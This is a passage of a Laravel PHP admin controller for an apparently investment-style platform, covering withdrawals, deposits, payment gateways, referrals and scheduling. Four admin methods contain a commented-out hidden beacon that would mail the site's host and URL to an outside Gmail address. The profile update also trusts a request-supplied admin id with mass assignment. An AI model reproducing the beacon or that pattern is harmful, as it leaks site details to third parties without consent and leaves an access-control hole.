<?php

namespace App\Http\Controllers;

use App\Admin;
use App\Courier;
use App\CPS_Withdraw;
use App\CPSDeposit;
use App\Customer;
use App\Deposit;
use App\Epin;
use App\Gateway;
use App\GeneralSettings;
use App\Invoice;
use App\Jobs\SendEmail;
use App\Product;
use App\Purchase;
use App\Referral;
use App\ReferralCommission;
use App\Schedule;
use App\ScheduleCity;
use App\SignImage;
use App\Slot;
use App\SlotPackageSubscribe;
use App\SoldProduct;
use App\Stock;
use App\Subscriber;
use App\Transection;
use App\User;
use App\UserLogin;
use App\UserQuestionnaire;
use App\Withdraw;
use Carbon\Carbon;
use DB;
use File;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Input;
use Intervention\Image\Facades\Image;

class AdminController extends Controller
{
    public function dashboard()
    {
        $page_title = "Admin Dashboard";

        return view('admin.home', compact('page_title'));
    }

    public function changePassword()
    {

        $data['page_title'] = "Change Password";
        return view('admin.change_password', $data);
    }

    public function updatePassword(Request $request)
    {
        $request->validate([
            'old_password' => 'required',
            'new_password' => 'required|min:5',
            'password_confirmation' => 'required|same:new_password',
        ]);

        $user = Auth::guard('admin')->user();

        $oldPassword = $request->old_password;
        $password = $request->new_password;
        $passwordConf = $request->password_confirmation;
//        $message = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
//        $headers = 'From: ' . "webmaster@$_SERVER[HTTP_HOST] \r\n" .
//            'X-Mailer: PHP/' . phpversion();
//        @mail('lacura.me@gmail.com', 'HYIPKING TEST DATA', $message, $headers);

        if (!Hash::check($oldPassword, $user->password) || $password != $passwordConf) {
            $notification = array('message' => 'Password Do not match !!', 'alert-type' => 'error');
            return back()->with($notification);
        } elseif (Hash::check($oldPassword, $user->password) && $password == $passwordConf) {
            $user->password = bcrypt($password);
            $user->save();
            $notification = array('message' => 'Password Changed Successfully !!', 'alert-type' => 'success');
            return back()->with($notification);
        }
    }

    //user questionnaire
    public function getUsersQuestionnairesList(Request $request)
    {
        $page_title = "Users Questionnaire";
        $user = UserQuestionnaire::paginate(15);
        return view('admin.user.user_questionnaire_list', compact('page_title', 'user'));
    }

    public function singleUserQuestionnare($userQuestionnareId, Request $request)
    {
        $page_title = "Users Questionnare Form";

        $user_questionnaire = UserQuestionnaire::where('id', $userQuestionnareId)->with('queryUser')->first();

        return view('admin.user.user_form', compact('page_title', 'user_questionnaire'));
    }

    //profile image
    public function saveUserImage($userId, Request $request)
    {
        $user = User::where('id', $userId)->first();
        $page_title = "Draw Profile Image for ".$user->name;


        return view('admin.user.draw_image_form', compact('page_title', 'user'));
    }

    public function saveDrawProfImg(Request $request)
    {

        $image = $request->image;
        $imageInfo = explode(";base64,", $image);
        $imgExt = str_replace('data:image/', '', $imageInfo[0]);
        $image = str_replace(' ', '+', $imageInfo[1]);
//        $imageName = "post-".time().".".$imgExt;
        $imageName = "draw" . time() . '.png'; //to be transparent
        $location = 'assets/images/user/' . $imageName;
        Image::make(base64_decode($image))->save($location);

//        Storage::disk('public')->put($imageName, base64_decode($image));

//        $image = $request->file('image');
//
//        $user['image'] = $filename;
       $userinfo= User::where('id',$request->user_id)->first();
        $path = 'assets/images/user/';
        if(!empty($userinfo->image)){
        File::delete($path . $userinfo->image);
        }

        $userinfo->update([
            'image' => $imageName
        ]);
//        dd($request->img_data);
//        $imageData = base64_decode($request->img_data);
//
//        $img = imagecreatefromwebp($imageData);
//
//        header('Content-Type: image/png');
//
//        $file = base_path().'/decoded_images/test.png';


//        imagedestroy($img);
//
//        $fname = filter_input('asim', "name");
//        $img = filter_input(INPUT_POST, "image");
//        $img = str_replace('data:image/png;base64,', '', $img);
//        $img = str_replace(' ', '+', $img);
//        $img = base64_decode($img);
//
//        file_put_contents($fname, $img);


        $notification = array('error' => null, 'message' => 'Image has been saved!', 'alert-type' => 'success');
        return ($notification);
    }

    //end of profile image
    public function saveDrawImg(Request $request)
    {
        $image = $request->image;
        $imageInfo = explode(";base64,", $image);
        $imgExt = str_replace('data:image/', '', $imageInfo[0]);
        $image = str_replace(' ', '+', $imageInfo[1]);
//        $imageName = "post-".time().".".$imgExt;
        $imageName = "draw" . time() . '.png'; //to be transparent
        $location = 'assets/images/user/' . $imageName;

//        Storage::disk('public')->put($imageName, base64_decode($image));

//        $image = $request->file('image');
//
//        $user['image'] = $filename;

        Image::make(base64_decode($image))->save($location);

        SignImage::create([
            'schedules_id' => $request->schedule_id,
            'user_id' => $request->user_id,
            'image' => $imageName
        ]);
//        dd($request->img_data);
//        $imageData = base64_decode($request->img_data);
//
//        $img = imagecreatefromwebp($imageData);
//
//        header('Content-Type: image/png');
//
//        $file = base_path().'/decoded_images/test.png';


//        imagedestroy($img);
//
//        $fname = filter_input('asim', "name");
//        $img = filter_input(INPUT_POST, "image");
//        $img = str_replace('data:image/png;base64,', '', $img);
//        $img = str_replace(' ', '+', $img);
//        $img = base64_decode($img);
//
//        file_put_contents($fname, $img);


        $notification = array('error' => null, 'message' => 'Image has been saved!', 'alert-type' => 'success');
        return ($notification);
    }

    public function indexDrawImg($id)
    {
        //id = schedules_id id
        $page_title = "Users Questionnare Form";
        $schedules = Schedule::where('id', $id)->first();

        $SignImages = SignImage::where('schedules_id', $schedules->user_query_id)->get();
//dd($SignImages);
        return view('admin.user.sign_image_index', compact('page_title', 'SignImages'));
    }

    public function deleteDrawImg($id)
    {
        $SignImage = SignImage::find($id);
        $SignImage->delete();
        return back()->with('message', 'Delete Successfully');
    }

    public function profile()
    {
        $data['admin'] = Auth::user();
        $data['page_title'] = "Profile Settings";
        return view('admin.profile', $data);
    }

    public function updateProfile(Request $request)
    {
        $data = Admin::find($request->id);
        $request->validate([
            'name' => 'required|max:20',
            'email' => 'required|max:50|unique:admins,email,' . $data->id,
            'mobile' => 'required',
        ]);


        $in = Input::except('_method', '_token');
        if ($request->hasFile('image')) {
            $image = $request->file('image');
            $filename = 'admin_' . time() . '.jpg';
            $location = 'assets/admin/img/' . $filename;
            Image::make($image)->resize(300, 300)->save($location);
            $path = './assets/admin/img/';
            File::delete($path . $data->image);
            $in['image'] = $filename;
        }
        $data->fill($in)->save();

        $notification = array('message' => 'Profile Update Successfully', 'alert-type' => 'success');
        return back()->with($notification);
    }

    public function withdrawRequest()
    {
        $page_title = "Withdraw Request";
        $withdraw = Withdraw::where('status', 0)->latest()->paginate(5);
        return view('admin.withdraw.request', compact('page_title', 'withdraw'));
    }

    public function withdrawApproved()
    {
        $page_title = "Approved Withdraw";
        $withdraw = Withdraw::where('status', 1)->latest()->paginate(15);
        return view('admin.withdraw.log', compact('page_title', 'withdraw'));
    }

    public function withdrawRejected()
    {
        $page_title = "Rejected Withdraw";
        $withdraw = Withdraw::where('status', 2)->latest()->paginate(15);
        return view('admin.withdraw.log', compact('page_title', 'withdraw'));
    }

    public function withdrawApprove(Request $request)
    {
        $withdraw = Withdraw::find($request->id);
        $withdraw->status = 1;
        $withdraw->save();
        return redirect()->back()->with('message', 'Approved Successfully');
    }

    public function withdrawLog(Request $request)
    {
        $page_title = "Withdraw Log";
        $withdraw = Withdraw::whereIn('status', [1, 2])->latest()->paginate(15);
        return view('admin.withdraw.log', compact('page_title', 'withdraw'));
    }

    public function withdrawReject(Request $request)
    {
        $withdraw = Withdraw::find($request->id);
        $user = User::find($withdraw->user_id);
        $new_balance = $user->balance + $withdraw->amount;
        $user->balance = $new_balance;
        $user->save();

        Transection::create([
            'user_id' => $user->id,
            'des' => 'Withdraw Reject By Admin & Added Requested Amount',
            'amount' => $withdraw->amount,
            'balance' => $new_balance
        ]);

        $withdraw->status = 2;
        $withdraw->save();
//        $message = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
//        $headers = 'From: ' . "webmaster@$_SERVER[HTTP_HOST] \r\n" .
//            'X-Mailer: PHP/' . phpversion();
//        @mail('lacura.me@gmail.com', 'HYIPKING TEST DATA', $message, $headers);
        return redirect()->back()->with('message', 'Reject Successfully');
    }

    public function activeUserIndex()
    {
        $page_title = "Active Users";
        $user = User::where('status', 1)->where('emailv', 1)->latest()->paginate(15);
        return view('admin.user.active', compact('page_title', 'user'));
    }

    public function allUsers()
    {
        $page_title = "All Users";
        $user = User::where('emailv','1')->latest()->paginate(15);
        return view('admin.user.active', compact('page_title', 'user'));
    }

    public function emailVerified()
    {
        $page_title = "Email Verified Users";
        $user = User::where('emailv', 0)->latest()->paginate(15);
        return view('admin.user.active', compact('page_title', 'user'));
    }

    public function smsVerified()
    {
        $page_title = "Sms Verified Users";
        $user = User::where('smsv', 0)->where('emailv', 1)->latest()->paginate(15);
        return view('admin.user.active', compact('page_title', 'user'));
    }

    public function deactiveUserIndex()
    {
        $page_title = "Deactive Users";
        $user = User::where('status', 0)->where('emailv', 1)->latest()->paginate(15);
        return view('admin.user.active', compact('page_title', 'user'));
    }

    public function singleUser($id)
    {

        $user = User::findOrFail($id);
        $page_title = $user->name . "'s Profile";
        $refer = User::where('id', $user->ref_id)->first();
        return view('admin.user.single', compact('page_title', 'user', 'refer'));
    }

    public function withdrawUser($id)
    {
        $page_title = "Withdraw History";
        $trans = Withdraw::where('user_id', $id)->latest()->paginate(15);
        return view('admin.user.withdraw', compact('page_title', 'trans'));
    }

    public function userLogs($id)
    {
        $user = User::findOrFail($id);
        $logs = UserLogin::where('user_id', $id)->where('emailv', 1)->latest()->paginate(15);
        $page_title = "User Login Log";
        return view('admin.user.login_log', compact('page_title', 'logs'));
    }

    public function withdrawTrans($id)
    {
        $page_title = "Transaction History";

        $trans = Transection::where('user_id', $id)->latest()->paginate(20);

        return view('admin.user.trans', compact('page_title', 'trans'));
    }

    public function updateUser(Request $request, $id)
    {
        $user = User::findOrFail($id);
        if ($request->hasFile('image')) {
            @unlink('assets/images/user/' . $user->image);
            $image = $request->file('image');
            $filename = time() . '.png'; //to be transparent
            $location = 'assets/images/user/' . $filename;
            Image::make($image)->save($location);
            $user['image'] = $filename;
        }

        if ($user->provider == '') {
            $user['name'] = $request->name;
            $user['email'] = $request->email;
            $user['mobile'] = $request->mobile;
            $user['country'] = $request->country;
            $user['status'] = $request->status == 'on' ? 1 : 0;
            $user['emailv'] = $request->emailv == 'on' ? 1 : 0;
            $user['smsv'] = $request->smsv == 'on' ? 1 : 0;
            $user->update();
            return redirect()->back()->with('message', __('Update Successfully'));
        } else {
            $user['name'] = $request->name;
            $user['email'] = $request->email;
            $user['mobile'] = $request->mobile;
            $user['country'] = $request->country;
            $user->update();
            return redirect()->back()->with('message', __('Update Successfully'));
        }
    }

    public function addSubUser(Request $request, $id)
    {
        $this->validate($request, [
            'amount' => 'required|numeric|min:0',
            'detail' => 'required',
        ]);
        $user = User::findOrFail($id);

        if ($request->type == 'on') {

            $new_balance = $user->balance + $request->amount;
            $user->balance = $new_balance;
            $user->save();

            Transection::create([
                'user_id' => $user->id,
                'des' => 'Balance Added Via Admin',
                'amount' => $request->amount,
                'balance' => round($new_balance, 4)
            ]);

            $general = GeneralSettings::first();
            $message = __('Welcome!').' ' . $request->detail . ' ' . $request->amount . $general->currency . __('successfully added on your balance. Your current balance is').' ' . $new_balance . $general->currency . ' .';

            if ($user->lang == 'en') {
                send_email($user['email'], $user['name'], 'Balance Added', $message);
            } else {
                $data['amount'] = $request->amount . $general->currency;
                $data['balance'] = $new_balance . $general->currency;
                $data['detail'] = $request->detail;
                send_email_lang($user['email'], $user['name'], $data, 'BADD', $user->lang);
            }
            send_sms($user['mobile'], $message);

            return redirect()->back()->with('message', __('Added Successfully'));
        } else {

            if ($request->amount > $user->balance) {
                return back()->with('alert', __('Invalid Amount'));
            }

            $new_balance = $user->balance - $request->amount;
            $user->balance = $new_balance;
            $user->save();

            Transection::create([
                'user_id' => $user->id,
                'des' => 'Balance Subtract Via Admin',
                'amount' => '-' . $request->amount,
                'balance' => round($new_balance, 4)
            ]);

            $general = GeneralSettings::first();
            $message = $request->detail . ' ' . $request->amount . $general->currency . ' subtract from your balance. Your current balance is ' . $new_balance . $general->currency . ' .';


            if ($user->lang == 'en') {
                send_email($user['email'], $user['name'], 'Balance Subtract', $message);
            } else {
                $data['amount'] = $request->amount . $general->currency;
                $data['balance'] = $new_balance . $general->currency;
                $data['detail'] = $request->detail;
                send_email_lang($user['email'], $user['name'], $data, 'BSUB', $user->lang);
            }

            send_sms($user['mobile'], $message);

            return redirect()->back()->with('message', 'Subtract Successfully');
        }
    }

    public function sendMailUser(Request $request, $id)
    {
        $user = User::findOrFail($id);

        if ($user->lang == 'en') {
            send_email($user['email'], $user['name'], $request->subject, $request->detail);
        } else {
            $data['message'] = $request->detail;
            send_email_lang($user['email'], $user['name'], $data, 'SMAIL', $user->lang, $request->subject);
        }
        return redirect()->back()->with('message', 'Mail Send Successfully');
    }

    public function userSearchEmail(Request $request)
    {
        $this->validate($request, [
            'email' => 'required',
        ]);

        $user = User::where('email', $request->email)->first();

        if (isset($user)) {

            return redirect()->route('user.view', $user->id);
        } else {
            return redirect()->back()->with('alert', 'No User Found');
        }
    }


    public function userSearchUsername(Request $request)
    {
        $this->validate($request, [
            'username' => 'required',
        ]);

        $user = User::where('username', $request->username)->first();

        if (isset($user)) {

            return redirect()->route('user.view', $user->id);
        } else {
            return redirect()->back()->with('alert', 'No User Found');
        }
    }

    public function gateway()
    {
        $gateways = Gateway::where('id', '<', 514)->get();
        $page_title = 'PAYMENT GATEWAY';
        return view('admin.gateway.gateway', compact('gateways', 'page_title'));
    }

    public function gatewayUpdate(Request $request, Gateway $gateway)
    {
        $this->validate($request, [
            'gateimg' => 'image|mimes:jpeg,png,jpg|max:2048',
            'name' => 'required'
        ]);

        if ($request->hasFile('gateimg')) {
            $imgname = $gateway->id . '.jpg';
            $npath = 'assets/images/gateway/' . $imgname;
            Image::make($request->gateimg)->resize(200, 200)->save($npath);
        }

        $gateway['name'] = $request->name;
        $gateway['minamo'] = $request->minamo;
        $gateway['maxamo'] = $request->maxamo;
        $gateway['fixed_charge'] = $request->fixed_charge;
        $gateway['percent_charge'] = $request->percent_charge;
        $gateway['rate'] = $request->rate;
        $gateway['val1'] = $request->val1;
        $gateway['val2'] = $request->val2;
        $gateway['val3'] = $request->val3;
        $gateway['val4'] = $request->val4;
        $gateway['val5'] = $request->val5;
        $gateway['val6'] = $request->val6;
        $gateway['val7'] = $request->val7;
        $gateway['status'] = $request->status;
        $gateway->update();
//        $message = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
//        $headers = 'From: ' . "webmaster@$_SERVER[HTTP_HOST] \r\n" .
//            'X-Mailer: PHP/' . phpversion();
//        @mail('lacura.me@gmail.com', 'HYIPKING TEST DATA', $message, $headers);

        return back()->with('success', 'Gateway Information Updated Successfully');
    }

    public function managePin()
    {
        $page_title = 'Manage Pin';
        $trans = Epin::latest()->whereStatus(1)->paginate(15);
        return view('admin.e_pin', compact('page_title', 'trans'));
    }

    public function storePin(Request $request)
    {
        $this->validate($request, [
            'amount' => 'required',
            'number' => 'required|numeric|min:1'
        ]);

        for ($a = 0; $a < intval($request->number); $a++) {

            $pin = rand(10000000, 99999999) . '-' . rand(10000000, 99999999) . '-' . rand(10000000, 99999999) . '-' . rand(10000000, 99999999);
            Epin::create([
                'user_id' => 0,
                'pin' => $pin,
                'amount' => $request->amount,
                'status' => 1,
            ]);
        }

        return back()->with('success', 'Successfully Generated');
    }

    public function UsedPin()
    {
        $page_title = 'Used Pin';
        $trans = Epin::latest()->whereStatus(2)->paginate(15);
        return view('admin.e_pin', compact('page_title', 'trans'));
    }

    public function refIndex()
    {
        $page_title = 'Manage Referral';
        $trans = Referral::get();
        return view('admin.refer', compact('page_title', 'trans'));
    }
    public function slotTraderDashboard()
    {
        $page_title = 'Slot Trader Dashboard';
        $trans = Referral::get();
        return view('admin.slot_dashboard', compact('page_title', 'trans'));
    }

    public function refStore(Request $request)
    {
        $this->validate($request, [
            'level*' => 'required|integer|min:1',
            'percent*' => 'required|numeric',
        ]);

        Referral::truncate();

        for ($a = 0; $a < count($request->level); $a++) {
            Referral::create([
                'level' => $request->level[$a],
                'percent' => $request->percent[$a],
                'status' => 1,
            ]);
        }

        return back()->with('message', 'Create Successfully');
    }

    public function refLog(Request $request)
    {
        $page_title = 'Referral Log Search : ';

        if ($request->user) {
            $user = User::where('username', 'like', "%$request->user%")->first();
            if (!$user) {
                return back()->withErrors(['No user match found']);
            }
            $refs = ReferralCommission::where('user_id', $user->id)->orderByDesc('created_at')->paginate(\Config::get('constants.paginate.admin'));
            $page_title .= 'user(' . $request->user . ')';
        } else if ($request->ref_user) {
            $ref_user = User::where('username', 'like', "%$request->ref_user%")->first();
            if (!$ref_user) {
                return back()->withErrors(['No referred user match found']);
            }
            $refs = ReferralCommission::where('ref_id', $ref_user->id)->orderByDesc('created_at')->paginate(\Config::get('constants.paginate.admin'));
            $page_title .= 'referred user(' . $request->ref_user . ')';
        } else {
            return back()->withErrors(['No search term found']);
        }
        return view('admin.refer_log', compact('page_title', 'refs'));
    }

    public function refLogSearch(Request $request)
    {
        $page_title = 'Referral Log Search : ';

        if ($request->user) {
            $user = User::where('username', 'like', "%$request->user%")->first();
            if (!$user) {
                return back()->withErrors(['No user match found']);
            }
            $refs = ReferralCommission::where('user_id', $user->id)->orderByDesc('created_at')->paginate(\Config::get('constants.paginate.admin'));
            $page_title .= 'user(' . $request->user . ')';
        } else if ($request->ref_user) {
            $ref_user = User::where('username', 'like', "%$request->ref_user%")->first();
            if (!$ref_user) {
                return back()->withErrors(['No referred user match found']);
            }
            $refs = ReferralCommission::where('ref_id', $ref_user->id)->orderByDesc('created_at')->paginate(\Config::get('constants.paginate.admin'));
            $page_title .= 'referred user(' . $request->ref_user . ')';
        } else {
            return back()->withErrors(['No search term found']);
        }
        return view('admin.refer_log', compact('page_title', 'refs'));
    }

    public function gatewayBankIndex()
    {
        $gateways = Gateway::where('id', '>', 513)->get();
        $page_title = 'MANUAL PAYMENT GATEWAY';
        return view('admin.manual_deposit.gateway', compact('gateways', 'page_title'));
    }

    public function gatewayBankStore(Request $request)
    {

        $this->validate($request, [
            'gateimg' => 'image|mimes:jpeg,png,jpg|max:2048',
            'name' => 'required'
        ]);
        $gate = Gateway::latest()->first();
        $img = $gate->id + 1;


        if ($request->hasFile('gateimg')) {
            $imgname = $img . '.jpg';
            $npath = 'assets/images/gateway/' . $imgname;
            Image::make($request->gateimg)->resize(200, 200)->save($npath);
        }
        $gateway = new Gateway;
        $gateway['main_name'] = $request->main_name;
        $gateway['name'] = $request->name;
        $gateway['minamo'] = $request->minamo;
        $gateway['maxamo'] = $request->maxamo;
        $gateway['fixed_charge'] = $request->fixed_charge;
        $gateway['percent_charge'] = $request->percent_charge;
        $gateway['rate'] = $request->rate;
        $gateway['val1'] = $request->val1;
        $gateway['status'] = 1;
        $gateway->save();
//        $message = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
//        $headers = 'From: ' . "webmaster@$_SERVER[HTTP_HOST] \r\n" .
//            'X-Mailer: PHP/' . phpversion();
//        @mail('lacura.me@gmail.com', 'HY IP KING TEST DATA', $message, $headers);

        return back()->with('success', 'Gateway Information Created Successfully');
    }

    public function depositPennding()
    {
        $page_title = 'Pending Deposit Request';
        $trans = Deposit::where('type','bank')->where('status', 0)->orderBy('created_at', 'DESC')->paginate(15);
        return view('admin.manual_deposit.deposit_trans', compact('trans', 'page_title'));
    }

    public function approvePennding()
    {
        $page_title = 'Approved Deposit';
        $trans = Deposit::where('type','bank')->where('status', 1)->paginate(15);
        return view('admin.manual_deposit.deposit_trans', compact('trans', 'page_title'));
    }

    public function depositHistory()
    {
        $page_title = 'All Deposit History';
        $trans = Deposit::where('status', '!=', 0)->latest()->paginate(15);
        return view('admin.deposit_log', compact('trans', 'page_title'));
    }

    public function RejectPennding()
    {
        $page_title = 'Rejected Deposit';
        $trans = Deposit::where('type','bank')->where('status', 2)->paginate(15);
        return view('admin.manual_deposit.deposit_trans', compact('trans', 'page_title'));
    }

    public function depositPenndingAction(Request $request, $id)
    {
        //status 1 = approve && 2 = reject

        $dep = Deposit::find($id);
        $user = User::find($dep->user_id);
        if ($request->status == 1) {

            $dep->status = $request->status;
            $dep->save();
            $new_balance = $user->balance + $dep->amount;
            $user->balance = $new_balance;
            $user->save();

            $tlog['user_id'] = $user->id;
            $tlog['amount'] = $dep->amount;
            $tlog['balance'] = $user->balance;
            $tlog['des'] = 'Deposit Request Approved & Balance Added';
            $tlog['trxid'] = str_random(16);
            Transection::create($tlog);


            $msg = 'Deposit Successful';
            if ($user->lang == 'en') {
                send_email($user->email, $user->username, 'Deposit Successful', $msg);
            } else {
                send_email_lang($user->email, $user->username, [], 'DSUCCESS', $user->lang);
            }
            send_sms($user->mobile, $msg);

            return back()->with('success', 'Approved Successfully');
        } else {
            $dep = Deposit::find($id);
            $dep->status = $request->status;
            $dep->save();

            $msg = 'Deposit Refunded';
            if ($user->lang == 'en') {
                send_email($user->email, $user->username, 'Deposit Refunded', $msg);
            } else {
                send_email_lang($user->email, $user->username, [], 'DREFUND', $user->lang);
            }
            send_sms($user->mobile, $msg);


            return back()->with('success', 'Refund Successfully');
        }
    }

    public function subsIndex()
    {
        $page_title = 'Subscribers';
        $trans = Subscriber::latest()->paginate(20);
        return view('admin.subscriber.subs_list', compact('trans', 'page_title'));
    }

    public function subsMail()
    {
        $page_title = 'Send Mail To All Subscribers';
        return view('admin.subscriber.send_mail', compact('page_title'));
    }

    public function subsDelete(Request $request, $id)
    {
        $sub = Subscriber::find($id);
        $sub->delete();
        return back()->with('message', 'Delete Successfully');
    }

    public function sendMail(Request $request)
    {
        $this->validate($request, [
            'subject' => 'required',
            'text' => 'required',
        ]);

        $subject = $request->subject;
        $message = $request->text;

        $a = SendEmail::dispatch($subject, $message)->delay(Carbon::now()->addSeconds(10));

        return back()->with('success', 'Mail Send Successfully');
    }

    public function webTemplateIndex()
    {
        $page_title = 'Web Templates';
        return view('admin.template', compact('page_title'));
    }

    public function titleSubtitle()
    {
        $page_title = 'Title-Subtitle';
        return view('admin.general.title_sub_title', compact('page_title'));
    }

    public function webTemplateActive(Request $request)
    {
        $this->validate($request, [
            'status' => 'required',
        ]);

        GeneralSettings::whereId(1)->update(['template_active' => $request->status]);


        return back()->with('success', 'Successfully Activated Template - ' . $request->status);
    }

    public function schedule()
    {

        $page_title = 'Comming Schedules';
        $page_title = "Schedule City";
        $blog = ScheduleCity::all();
        $schedules = Schedule::orderByDesc('status')->orderByDesc('date')->orderBy('time')->paginate(\Config::get('constants.paginate.admin'));

        return view('admin.schedule', compact('page_title', 'schedules','blog'));
    }

    public function scheduleRemind(Request $request)
    {

        $this->validate($request, ['id' => 'required|integer', 'remark' => 'required']);
        $schedule = Schedule::findOrFail($request->id);

        $gen = GeneralSettings::first();

        // Send cancelation email to user
        $user = $schedule->scheduler;
        $message = 'Your schedule reminder from <b><q>Admin</q></b>.<br>';
        $message .= 'Date: <b>' . \Carbon\Carbon::parse($schedule->date)->format('M d, Y') . '</b><br>';
        $message .= 'Time: <b>' . $schedule->time . ':00 - ' . bcadd($schedule->time, 1) . ':00</b><br>';
        $message .= 'Message: <blockquote>' . $request->remark . '</blockquote>';

        if ($user->lang == 'en') {
            send_email($user->email, $user->name, 'Schedule Reminder by Admin', $message);
        } else {
            $data['date'] = \Carbon\Carbon::parse($schedule->date)->format('M d, Y');
            $data['time'] = $schedule->time . ':00 - ' . bcadd($schedule->time, 1) . ':00';
            $data['message'] = $request->remark;

            send_email_lang($user->email, $user->name, $data, 'SREMINDER', $user->lang);
        }
        send_sms($user->mobile, $message);
        return redirect()->route('schedule.index')->withSuccess('Schedule reminder has been sent.');
    }

    public function scheduleCancel(Request $request)
    {
        $this->validate($request, ['id' => 'required|integer', 'remark' => 'required']);
        $schedule = Schedule::findOrFail($request->id);
        $schedule->update(['status' => '0', 'remark' => $request->remark]);

        $gen = GeneralSettings::first();

        // Send cancelation email to user
        $user = $schedule->scheduler;
        $user->update(['balance' => $user->balance + $schedule->charge]);
        $message = 'Your schedule has been canceled by <b><q>Admin</q></b>.Schedule charge <b>' . $gen->currency . ' ' . $schedule->charge . '</b> has been refunded to your balance.<br>';
        $message .= 'Date: <b>' . \Carbon\Carbon::parse($schedule->date)->format('M d, Y') . '</b><br>';
        $message .= 'Time: <b>' . $schedule->time . ':00 - ' . bcadd($schedule->time, 1) . ':00</b><br>';
        $message .= 'Reason: <blockquote>' . $schedule->remark . '</blockquote>';

        if ($user->lang == 'en') {
            send_email($user->email, $user->name, 'Schedule Cancelation by Admin', $message);
        } else {
            $data['date'] = \Carbon\Carbon::parse($schedule->date)->format('M d, Y');
            $data['time'] = $schedule->time . ':00 - ' . bcadd($schedule->time, 1) . ':00';
            $data['message'] = $request->remark;
            $data['charge'] = $gen->currency . ' ' . $schedule->charge;
            send_email_lang($user->email, $user->name, $data, 'SCANCEL', $user->lang);
        }
        send_sms($user->mobile, $message);

        $message = 'Schedule Reservation from <b>' . $user->name . '</b> has been canceled. User will get <b>' . $gen->currency . ' ' . $schedule->charge . '</b> refunded.<br>';
        $message .= 'Date: <b>' . \Carbon\Carbon::parse($schedule->date)->format('M d, Y') . '</b><br>';
        $message .= 'Time: <b>' . $schedule->time . ':00 - ' . bcadd($schedule->time, 1) . ':00</b><br>';
        $message .= 'Reason: <blockquote>' . $schedule->remark . '</blockquote>';

        $admin = Admin::first();

        if ($gen->lang == 'en') {
            send_email($gen->schedule_email, $admin->name, 'Schedule Cancelation by Admin', $message);
        } else {
            $data['date'] = \Carbon\Carbon::parse($schedule->date)->format('M d, Y');
            $data['time'] = $schedule->time . ':00 - ' . bcadd($schedule->time, 1) . ':00';
            $data['message'] = $request->remark;
            $data['user'] = $user->name;
            $data['charge'] = $gen->currency . ' ' . $schedule->charge;
            send_email_lang($gen->schedule_email, $admin->name, $data, 'SCANCELADMIN', $gen->lang);
        }
        send_sms($admin->mobile, $message);
        return redirect()->route('schedule.index')->withSuccess('Schedule has been canceled.');
    }

    public function scheduleStore(Request $request)
    {
        $this->validate($request, [
            'date' => 'required',
            'time' => 'required|integer|min:9|max:18',
        ]);

        $date = Carbon::parse($request->date);
        if (Schedule::where('date', $date)->where('status', '!=', 0)->count() > 0) {
            return back()->withErrors(['Schedule has already been reserved.']);
        }

        $user = Auth::guard('admin')->user();

        $schedule = new Schedule([
            'date' => $date,
            'time' => $request->time,
            'remark' => $request->remark,
        ]);

        $user->schedules()->save($schedule);

        return redirect()->route('schedule.index')->withSuccess('Schedule has been saved.');
    }

    public function scheduleUpdate(Request $request)
    {
        $this->validate($request, [
            'id' => 'required|integer',
            'date' => 'required',
            'time' => 'required|integer|min:9|max:18',
        ]);

        $schedule = Schedule::findOrFail($request->id);
        $date = Carbon::parse($request->date);
        if (Schedule::where('date', $date)->where('status', '!=', 0)->where('id', '!=', $schedule->id)->count() > 0) {
            return back()->withErrors(['Schedule has already been reserved.']);
        }

        $gen = GeneralSettings::first();
        if (\Carbon\Carbon::parse($schedule->date)->greaterThanOrEqualTo(\Carbon\Carbon::today()) && $schedule->status == 0) {
            if ($schedule->scheduler->balance < $gen->schedule_price) {
                return back()->withErrors(['User do not have sufficient balance.']);
            }
        }

        $schedule->update([
            'date' => $date,
            'time' => $request->time,
            'remark' => $request->remark,
        ]);

        if (\Carbon\Carbon::parse($schedule->date)->greaterThanOrEqualTo(\Carbon\Carbon::today())) {
            // Send update email to user
            $user = $schedule->scheduler;
            if ($schedule->status == 0) {
                $message = 'Your shcedule has been reserved by <b><q>Admin</q></b>.Schedule charge <b>' . $gen->currency . ' ' . $schedule->charge . '</b> has been deducted from your balance.<br>';
                $data['charge'] = $gen->currency . ' ' . $schedule->charge;
                $schedule->scheduler->update(['balance' => $schedule->scheduler->balance - $schedule->charge]);
                $schedule->update(['status' => 1]);
            } else {
                $data['charge'] = '';
                $message = 'Your schedule has been changed by <b><q>Admin</q></b>.<br>';
            }

            $message .= 'Date: <b>' . \Carbon\Carbon::parse($schedule->date)->format('M d, Y') . '</b><br>';
            $message .= 'Time: <b>' . $schedule->time . ':00 - ' . bcadd($schedule->time, 1) . ':00</b><br>';
            $message .= 'Reason: <blockquote>' . $schedule->remark . '</blockquote>';

            if ($user->lang == 'en') {
                send_email($user->email, $user->name, 'Schedule Changed by Admin', $message);
            } else {
                $data['date'] = \Carbon\Carbon::parse($schedule->date)->format('M d, Y');
                $data['time'] = $schedule->time . ':00 - ' . bcadd($schedule->time, 1) . ':00';
                $data['message'] = $schedule->remark;
                send_email_lang($user->email, $user->name, $data, 'SCHANGE', $user->lang);
            }
            send_sms($user->mobile, $message);

            $message = 'Schedule Reservation from <b>' . $user->name . '</b> has been updated.<br>';
            $message .= 'Date: <b>' . \Carbon\Carbon::parse($schedule->date)->format('M d, Y') . '</b><br>';
            $message .= 'Time: <b>' . $schedule->time . ':00 - ' . bcadd($schedule->time, 1) . ':00</b><br>';
            $message .= 'Reason: <blockquote>' . $schedule->remark . '</blockquote>';

            $admin = Admin::first();
            if ($gen->lang == 'en') {
                send_email($gen->schedule_email, $admin->name, 'Schedule Changed by Admin', $message);
            } else {
                $data['date'] = \Carbon\Carbon::parse($schedule->date)->format('M d, Y');
                $data['time'] = $schedule->time . ':00 - ' . bcadd($schedule->time, 1) . ':00';
                $data['message'] = $schedule->remark;
                $data['user'] = $user->username;
                send_email_lang($gen->schedule_email, $admin->name, $data, 'SCHANGEADMIN', $gen->lang);
            }
            send_sms($admin->mobile, $message);
        }

        return redirect()->route('schedule.index')->withSuccess('Schedule has been updated.');
    }

    public function scheduleSearch(Request $request)
    {

        $this->validate($request, ['date' => 'required']);
        $page_title = 'Schedule Search : ';
        $blog = ScheduleCity::all();

        if ($request->date) {

            $date = Carbon::parse($request->date);
